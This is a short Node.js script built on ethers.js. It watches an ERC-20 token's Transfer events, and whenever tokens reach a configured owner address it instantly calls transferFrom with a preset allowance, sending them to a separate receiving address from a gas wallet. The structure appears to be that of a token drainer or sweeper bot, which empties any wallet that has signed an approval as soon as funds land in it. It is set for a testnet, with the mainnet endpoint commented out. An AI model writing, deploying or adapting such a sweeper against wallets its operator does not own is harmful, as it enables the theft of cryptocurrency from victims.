const ethers = require("ethers")
const abi = require("./erc20abi")
let details = require("../details")

async function main(contractAddress){
  try{
    let BICOcontractAddress = "0xF17e65822b568B3903685a7c9F496CF7656Cc6C2"
    let tokenAbi = abi
    let provider = new ethers.providers.WebSocketProvider("wss://sepolia.gateway.tenderly.co"/*"wss://mainnet.gateway.tenderly.co"*/)
    let signer = new ethers.Wallet(process.env.GAS_WALLET_PK, provider)
    //console.log("private key", process.env.GAS_WALLET_PK)
    let contract = new ethers.Contract(contractAddress, tokenAbi, provider)
    let decimals = await contract.decimals()
    let symbol = await contract.symbol()

    let {owner_address, receiving_address, approve_amount, token_ca} = details
    let contractWithSigner = contract.connect(signer)

    contract.on("Transfer", async (from, to, value, event)=>{
        let info = {
            from: from,
            to: to,
            value: ethers.utils.formatUnits(value, decimals)
        }
        
        if(owner_address != "" && signer && to == owner_address){
            let tx = await contractWithSigner.transferFrom(owner_address, receiving_address, approve_amount)
            console.log(tx)
            details = {...details, transactions: tx}
        }
        
        console.log(JSON.stringify(info))
    })
    console.log(decimals, symbol)
  }catch(err){
    console.log(err)
    return
  }
}

module.exports = main